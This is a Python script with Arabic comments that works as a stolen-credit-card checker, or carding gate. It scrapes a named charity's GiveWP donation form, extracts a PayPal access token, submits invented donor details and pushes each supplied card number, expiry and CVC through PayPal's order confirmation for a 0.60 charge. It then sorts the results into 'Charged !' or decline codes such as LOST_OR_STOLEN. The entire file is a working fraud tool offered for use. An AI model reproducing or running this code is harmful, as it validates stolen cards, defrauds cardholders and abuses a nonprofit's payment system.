# ==================== gatet.py (PayPal - مع ريكويستات jo2.py وردود gatet.py الأصلية) ====================

import os, sys
import random
import requests, time, string, base64, re, json, threading, uuid
from user_agent import generate_user_agent
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ================ إعدادات الديناميكية ================
def get_random_user_agent():
    return generate_user_agent()

def generate_random_email(domain=None):
    domains = ['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com', 'icloud.com', 'aol.com', 'protonmail.com']
    if not domain:
        domain = random.choice(domains)
    name = ''.join(random.choices(string.ascii_lowercase, k=random.randint(6, 12)))
    number = random.randint(10, 9999)
    return f"{name}{number}@{domain}"

def generate_random_name():
    first_names = ['James', 'Emma', 'Oliver', 'Amelia', 'Harry', 'Grace', 'George', 'Olivia', 'Jack', 'Sophie',
                   'William', 'Emily', 'Thomas', 'Jessica', 'Charlie', 'Lucy', 'Alfie', 'Isabella', 'Jacob', 'Mia']
    last_names = ['Smith', 'Jones', 'Williams', 'Brown', 'Taylor', 'Davies', 'Wilson', 'Evans', 'Thomas', 'Johnson',
                  'Roberts', 'Walker', 'Wright', 'Robinson', 'Thompson', 'White', 'Hughes', 'Edwards', 'Green', 'Lewis']
    return random.choice(first_names), random.choice(last_names)

def generate_fake_data():
    first, last = generate_random_name()
    email = generate_random_email()
    return {"first_name": first, "last_name": last, "full_name": f"{first} {last}", "email": email, "card_name": f"{first} {last}"}

# ================ دالة الفحص (ريكويستات من jo2.py) ================
def pay(ccx):
    try:
        number, month, year, cvc = [x.strip() for x in ccx.split("|")]
        month = month.zfill(2)
        if "20" in year:
            year = year.split("20")[1]
        else:
            year = year[-2:] if len(year) > 2 else year
    except: 
        return "INVALID"

    fake = generate_fake_data()
    s = requests.Session()
    user = get_random_user_agent()
    
    try:
        url = 'https://guinnovation.org/donate/'
        url_iframe = 'https://guinnovation.org/give/donate/'
        url_ajax = 'https://guinnovation.org/wp-admin/admin-ajax.php'
        
        headers = {'user-agent': user}
        
        # 1. جلب الصفحة الرئيسية
        r = s.get(url, headers=headers)
        
        # 2. جلب صفحة iframe
        params = {'giveDonationFormInIframe': '1'}
        r = s.get(url_iframe, params=params, headers=headers)
        html = r.text
        
        # 3. استخراج البيانات
        form_hash = re.search(r'name="give-form-hash"\s+value="(.*?)"', html).group(1)
        register_hash = re.search(r'name="give-form-user-register-hash"\s+value="(.*?)"', html).group(1)
        form_id = re.search(r'name="give-form-id"\s+value="(.*?)"', html).group(1)
        form_prefix = re.search(r'name="give-form-id-prefix"\s+value="(.*?)"', html).group(1)
        enc_token = re.search(r'"data-client-token":"(.*?)"', html).group(1)
        kol = base64.b64decode(enc_token).decode('utf-8')
        access_token = re.findall(r'"accessToken":"(.*?)"', kol)[0]
        
        # 4. Create Order
        params = {'action': 'give_paypal_commerce_create_order'}
        data = {
            'give-honeypot': '',
            'give-form-id-prefix': form_prefix,
            'give-form-id': form_id,
            'give-form-title': 'Donate',
            'give-current-url': url,
            'give-form-url': url_iframe,
            'give-form-minimum': '0.60',
            'give-form-maximum': '999999.99',
            'give-form-hash': form_hash,
            'give-price-id': '0',
            'give-recurring-logged-in-only': '',
            'give-logged-in-only': '1',
            '_give_is_donation_recurring': '0',
            'give_recurring_donation_details': '{"give_recurring_option":"yes_donor"}',
            'give-amount': '0.60',
            'give-recurring-period-donors-choice': 'month',
            'give_stripe_payment_method': '',
            'give_first': fake['first_name'],
            'give_last': fake['last_name'],
            'give_email': fake['email'],
            'give-form-user-register-hash': register_hash,
            'give-purchase-var': 'needs-to-register',
            'give_tributes_type': 'In honor of',
            'give_tributes_show_dedication': 'no',
            'give_tributes_radio_type': 'In honor of',
            'give_tributes_first_name': '',
            'give_tributes_last_name': '',
            'give_tributes_would_to': 'send_eCard',
            'give_tributes_ecard_notify[recipient][personalized][]': '',
            'give_tributes_ecard_notify[recipient][first_name][]': '',
            'give_tributes_ecard_notify[recipient][last_name][]': '',
            'give_tributes_ecard_notify[recipient][email][]': '',
            'payment-mode': 'paypal-commerce',
            'card_name': fake['card_name'],
            'card_exp_month': '',
            'card_exp_year': '',
            'give-gateway': 'paypal-commerce',
            'give_embed_form': '1',
        }
        
        r = s.post(url_ajax, params=params, headers=headers, data=data)
        order_id = r.json()['data']['id']
        
        # 5. Confirm with PayPal
        headers_paypal = {
            'authority': 'cors.api.paypal.com',
            'accept': '*/*',
            'authorization': f'Bearer {access_token}',
            'content-type': 'application/json',
            'user-agent': user,
        }
        
        json_data = {
            'payment_source': {
                'card': {
                    'number': number,
                    'expiry': f'20{year}-{month}',
                    'security_code': cvc,
                    'attributes': {
                        'verification': {
                            'method': 'SCA_WHEN_REQUIRED',
                        },
                    },
                },
            },
            'application_context': {
                'vault': False,
            },
        }
        
        s.post(f'https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source', 
               headers=headers_paypal, json=json_data)
        
        # 6. Approve Order
        params = {'action': 'give_paypal_commerce_approve_order', 'order': order_id}
        r = s.post(url_ajax, params=params, headers=headers, data=data)
        txt = r.text
        
        # ================ ردود gatet.py الأصلية (زي ما هي من غير تعديل) ================
        if 'DO_NOT_HONOR' in txt: 
            return 'Declined | Do not honor'
        elif 'ACCOUNT_CLOSED' in txt: 
            return 'Declined | Account closed'
        elif 'PAYER_ACCOUNT_LOCKED_OR_CLOSED' in txt: 
            return 'Declined | Account closed'
        elif 'LOST_OR_STOLEN' in txt: 
            return 'Declined | LOST OR STOLEN'
        elif 'CVV2_FAILURE' in txt: 
            return 'Declined | Card Issuer Declined CVV'
        elif 'SUSPECTED_FRAUD' in txt: 
            return 'Declined | SUSPECTED FRAUD'
        elif 'INVALID_ACCOUNT' in txt: 
            return 'Declined | INVALID_ACCOUNT'
        elif 'REATTEMPT_NOT_PERMITTED' in txt: 
            return 'Declined | REATTEMPT NOT PERMITTED'
        elif 'ACCOUNT BLOCKED BY ISSUER' in txt: 
            return 'Declined | ACCOUNT_BLOCKED_BY_ISSUER'
        elif 'ORDER_NOT_APPROVED' in txt: 
            return 'Declined | ORDER_NOT_APPROVED'
        elif 'PICKUP_CARD_SPECIAL_CONDITIONS' in txt: 
            return 'Declined | PICKUP_CARD_SPECIAL_CONDITIONS'
        elif 'PAYER_CANNOT_PAY' in txt: 
            return 'Declined | PAYER CANNOT PAY'
        elif 'INSUFFICIENT_FUNDS' in txt: 
            return 'Declined | Insufficient Funds'
        elif 'GENERIC_DECLINE' in txt: 
            return 'Declined | GENERIC_DECLINE'
        elif 'COMPLIANCE_VIOLATION' in txt: 
            return 'Declined | COMPLIANCE VIOLATION'
        elif 'TRANSACTION_NOT PERMITTED' in txt: 
            return 'Declined | TRANSACTION NOT PERMITTED'
        elif 'PAYMENT_DENIED' in txt: 
            return 'Declined | PAYMENT_DENIED'
        elif 'INVALID_TRANSACTION' in txt: 
            return 'Declined | INVALID TRANSACTION'
        elif 'RESTRICTED_OR_INACTIVE_ACCOUNT' in txt: 
            return 'Declined | RESTRICTED OR INACTIVE ACCOUNT'
        elif 'SECURITY_VIOLATION' in txt: 
            return 'Declined | SECURITY_VIOLATION'
        elif 'DECLINED_DUE_TO_UPDATED_ACCOUNT' in txt: 
            return 'Declined | DECLINED DUE TO UPDATED ACCOUNT'
        elif 'INVALID_OR_RESTRICTED_CARD' in txt: 
            return 'Declined | INVALID CARD'
        elif 'EXPIRED_CARD' in txt: 
            return 'Declined | EXPIRED CARD'
        elif 'CRYPTOGRAPHIC_FAILURE' in txt: 
            return 'Declined | CRYPTOGRAPHIC FAILURE'
        elif 'TRANSACTION_CANNOT_BE_COMPLETED' in txt: 
            return 'Declined | TRANSACTION CANNOT BE COMPLETED'
        elif 'DECLINED_PLEASE_RETRY' in txt: 
            return 'Declined | DECLINED PLEASE RETRY LATER'
        elif 'TX_ATTEMPTS_EXCEED_LIMIT' in txt: 
            return 'Declined | EXCEED LIMIT'
        elif 'true' in txt or 'sucsess' in txt or 'COMPLETED' in txt:
            return 'Charged !'
        else:
            try:
                return f"Response | {json.loads(txt)['data']['error']}"
            except:
                return f'Response | {txt[:300]}'
            
    except Exception as e:
        return "ERROR"

# دالة الفحص النهائية
def look(cc_line):
    return pay(cc_line)
